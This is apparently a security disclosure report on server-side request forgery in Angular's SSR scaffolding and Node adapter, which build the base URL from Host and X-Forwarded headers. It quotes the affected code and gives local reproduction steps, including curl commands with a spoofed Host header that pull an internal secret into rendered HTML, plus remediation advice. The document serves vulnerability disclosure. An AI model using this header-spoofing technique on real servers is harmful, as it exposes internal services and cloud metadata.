# Host/Forwarded Header–Derived SSR Base URL Can Steer SSR HttpClient Requests

## Executive Summary
**Issue type:** SSRF via host/forwarded header influence on SSR base URL  
**Scope:** Angular‑supplied SSR scaffolding and Node SSR adapter default behavior  
**Severity:** Medium (context‑dependent)  
**Why this is an Angular issue:** Angular ships code (templates + adapter) that derives the SSR request URL from `Host`/`X‑Forwarded-*` headers without guidance or a safe default. When apps perform **relative** SSR `HttpClient` calls, those requests can be directed to attacker‑controlled/internal hosts.

This is **not** a claim that Angular “automatically fetches” data. The risk occurs when apps make SSR `HttpClient` calls and build the SSR request URL from untrusted headers (a pattern present in Angular‑supplied code).

---

## Impact (conditional)
If an attacker can influence `Host` or `X‑Forwarded‑Host` headers, **relative SSR HttpClient requests** can resolve against attacker‑chosen origins. This can result in:
- Internal service access (127.0.0.1, 10.x, 192.168.x, Docker networks)
- Cloud metadata access (169.254.169.254) **if** the app requests those paths
- Data exposure in SSR HTML or timing differences

---

## Concrete Impact (from repros)
- **Data exfiltration into SSR HTML:** Both repros show the SSR response containing `INTERNAL_SECRET_123` when the `Host` header is set to the internal service, demonstrating server‑side access to internal data and inclusion in rendered HTML.
- **Practical exploitability on Angular SSR defaults:** The stock ngmodule SSR example (no code changes) can be steered to fetch `/api-2` from the attacker‑chosen host when a relative request is made during SSR.
**This is not a “request‑only” SSRF:** the repros show internal data flowing back into the rendered HTML, which is attacker‑visible.

---

## Attack Scenario (who / how / impact)
**Attacker:** Any remote client who can send requests to the SSR endpoint (no auth required).  
**Goal:** Exfiltrate internal data reachable only from the SSR server (e.g., localhost/private network services).  
**How it plays out:**
1) Attacker sends a request with a crafted `Host` (or `X‑Forwarded‑Host` via misconfigured proxy).
2) Angular SSR uses the header‑derived base URL to resolve relative `HttpClient` calls during render.
3) SSR performs a server‑side request to the attacker‑chosen internal host and embeds the response into HTML.
4) Attacker receives the SSR HTML and extracts the internal data (or infers it via timing).

---

## Preconditions (all required)
1) SSR app performs **relative** `HttpClient` requests during SSR  
2) SSR base URL is derived from request headers (Host/Forwarded)  
3) Attacker can influence those headers (directly or via misconfigured proxies)  
4) SSR response or timing is observable by the attacker  

---

## Attacker Control & “Against Other Users” Framing
**Who controls the headers:** Attackers can supply arbitrary `Host` headers in direct requests, or influence `X‑Forwarded‑Host` / `X‑Forwarded‑Proto` when proxies or load balancers are misconfigured to trust unvalidated values.  

**How this affects other users:** In multi‑tenant SSR or shared SSR infrastructure, an attacker can force the server to fetch internal data during SSR and have it rendered into the HTML response that the attacker receives. This is a server‑side impact that does not require compromising a victim user’s browser.

---

## Tested Versions / Environment
- Angular repo version: **21.1.0-next.4** (`package.json`)
- @angular/ssr: **21.1.0-next.2** (`node_modules/@angular/ssr/package.json`)
- Node.js: **v24.4.1**

---

## Relationship to V‑001
V‑001 documents the core platform‑server issue: `INITIAL_CONFIG.url` is accepted without validation and is used to resolve **relative** SSR `HttpClient` requests. This report shows the **concrete exploit path** in Angular‑supplied SSR scaffolding and the Node SSR adapter that commonly **populate `INITIAL_CONFIG.url` from untrusted Host/Forwarded headers**, making the V‑001 issue reachable in default setups.

---

## Evidence in Angular‑supplied Code

### 1) CLI “server‑builder” template uses `headers.host`
**File:** `node_modules/@schematics/angular/ssr/files/server-builder/server.ts.template`  
**Behavior:** Constructs SSR URL using `headers.host`
```ts
const { protocol, originalUrl, baseUrl, headers } = req;
url: `${protocol}://${headers.host}${originalUrl}`,
```

### 2) Node SSR adapter builds request URL from Host/Forwarded headers
**File:** `node_modules/@angular/ssr/fesm2022/node.mjs`  
**Function:** `createRequestUrl(nodeRequest)`  
**Behavior:** Uses `x-forwarded-host` or `headers.host` to build the SSR request URL
```js
const protocol = getFirstHeaderValue(headers['x-forwarded-proto']) ?? ...;
const hostname = getFirstHeaderValue(headers['x-forwarded-host']) ?? headers.host ?? headers[':authority'];
return new URL(`${protocol}://${hostnameWithPort}${originalUrl ?? url}`);
```

### 3) Stock ngmodule SSR example uses `headers.host`
**File:** `integration/platform-server/projects/ngmodule/server.ts`
```ts
url: `${protocol}://${headers.host}${originalUrl}`,
```

These sources establish that Angular‑supplied code **derives SSR base URL from Host/Forwarded headers** by default.

---

## Why this is security‑relevant default behavior
Angular’s official SSR templates and the Node adapter build the SSR request URL from incoming headers by default. This makes the header‑derived base URL the **de facto default** for SSR setups, so apps that follow the scaffolded patterns inherit the risk unless they explicitly pin or validate the origin.

---

## Data‑flow chain (header → SSR `HttpClient` request)
1) **Header‑derived URL is built** in Angular‑supplied server code:
   - CLI server template: `node_modules/@schematics/angular/ssr/files/server-builder/server.ts.template`
   - Node SSR adapter: `node_modules/@angular/ssr/fesm2022/node.mjs` (`createRequestUrl`)
2) That URL becomes `INITIAL_CONFIG.url`, feeding `ServerPlatformLocation`:
   - `packages/platform-server/src/location.ts` (constructor assigns protocol/hostname/port from `config.url`)
3) **Relative SSR HttpClient requests are rewritten** against that base:
   - `packages/platform-server/src/http.ts` (`relativeUrlsTransformerInterceptorFn`)

---

## Repro Evidence (local, controlled)
### Quick Repro (minimal)
1) Start the minimal SSR repro (from repo root):
```bash
corepack pnpm ts-node --transpile-only --project BugBounty/Repros/ssrf-ssr-app/tsconfig.json BugBounty/Repros/ssrf-ssr-app/server.ts
```
2) Trigger SSRF via Host header:
```bash
curl -H 'Host: 127.0.0.1:4401' http://127.0.0.1:4400/
```
**Expected:** HTML includes `INTERNAL_SECRET_123`.

---

### A) Minimal SSR app repro
**Location:** `BugBounty/Repros/ssrf-ssr-app`  
**What it shows:** Host‑header‑derived SSR base causes SSR `HttpClient.get('/secret')` to resolve to attacker‑chosen internal host.

**Setup (from repo root):**
```bash
mkdir -p BugBounty/Repros/ssrf-ssr-app/node_modules/@angular
ln -sfn dist/packages-dist/common BugBounty/Repros/ssrf-ssr-app/node_modules/@angular/common
ln -sfn dist/packages-dist/core BugBounty/Repros/ssrf-ssr-app/node_modules/@angular/core
ln -sfn dist/packages-dist/platform-browser BugBounty/Repros/ssrf-ssr-app/node_modules/@angular/platform-browser
ln -sfn dist/packages-dist/platform-server BugBounty/Repros/ssrf-ssr-app/node_modules/@angular/platform-server
mkdir -p dist/packages-dist/node_modules/@angular
ln -sfn dist/packages-dist/common dist/packages-dist/node_modules/@angular/common
ln -sfn dist/packages-dist/core dist/packages-dist/node_modules/@angular/core
ln -sfn dist/packages-dist/platform-browser dist/packages-dist/node_modules/@angular/platform-browser
ln -sfn dist/packages-dist/platform-server dist/packages-dist/node_modules/@angular/platform-server
corepack pnpm ts-node --transpile-only --project BugBounty/Repros/ssrf-ssr-app/tsconfig.json BugBounty/Repros/ssrf-ssr-app/server.ts
```
This starts:
- Internal server: `http://127.0.0.1:4401/secret`
- SSR server: `http://127.0.0.1:4400/`

**Exploit demo:**
```bash
curl -H 'Host: 127.0.0.1:4401' http://127.0.0.1:4400/
```
**Expected result:** SSR HTML contains `INTERNAL_SECRET_123`.

### B) Stock ngmodule SSR example repro
**Location:** `BugBounty/Repros/ssrf-stock-ngmodule`  
**What it shows:** Angular’s own ngmodule SSR example is exploitable with Host header + relative SSR fetch (`/api-2`).

**Setup (terminal A, repo root):**
```bash
corepack pnpm -C integration/platform-server install
corepack pnpm -C integration/platform-server build:ngmodule
corepack pnpm -C integration/platform-server serve:ngmodule
```

**Internal mock API (terminal B):**
```bash
node BugBounty/Repros/ssrf-stock-ngmodule/internal-api.js
```

**Exploit demo:**
```bash
curl -H 'Host: 127.0.0.1:4401' http://127.0.0.1:4206/http-transferstate-lazy
```
**Expected result:** SSR HTML contains `INTERNAL_SECRET_123`.

---

## Root Cause
Angular SSR constructs the SSR request URL from request headers (`Host`, `X‑Forwarded‑Host`, `X‑Forwarded‑Proto`) by default. Relative SSR `HttpClient` requests are resolved against this base URL. If headers are untrusted, the base becomes attacker‑controlled.

---

## Severity (Adjusted)
**Default rating: Medium (CVSS ~5.3)**  
Vector suggestion: `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`  

**Rationale vs prior report:** The earlier report used **Medium–High** when tying the issue to sensitive data exposure (e.g., metadata credentials) in a real deployment. This v2 report keeps **Medium** as a default because impact depends on app‑specific SSR data fetches and observable responses.  

Escalate severity if evidence shows SSR fetches sensitive internal endpoints (e.g., metadata, internal APIs) and the data is exposed in rendered HTML or other attacker‑visible channels.

**Current evidence level:** The local repros demonstrate internal data exfiltration into HTML, which supports **Medium**. Without proof of high‑value data exposure in a production deployment, escalation to Medium–High remains conditional.

---

## Recommendations (practical and non‑breaking)
1) **Update Angular‑supplied templates** to avoid `headers.host` by default and instead use a **trusted origin** (env/allowlist) for the SSR URL.
2) **Document the trust boundary**: `Host` and `X‑Forwarded-*` are untrusted unless explicitly validated/allow‑listed by the deployment.
3) **Add a safe override** in the SSR adapter (`@angular/ssr/node`) to pin the request origin if configured (opt‑in, non‑breaking).

---

## Conclusion
This is a **real SSRF risk** in production‑relevant Angular SSR flows **when common app patterns are present**. The strongest evidence is that **Angular ships templates and adapter behavior that derive the SSR base URL from request headers** without guardrails, and that Angular’s own ngmodule example is exploitable in practice.
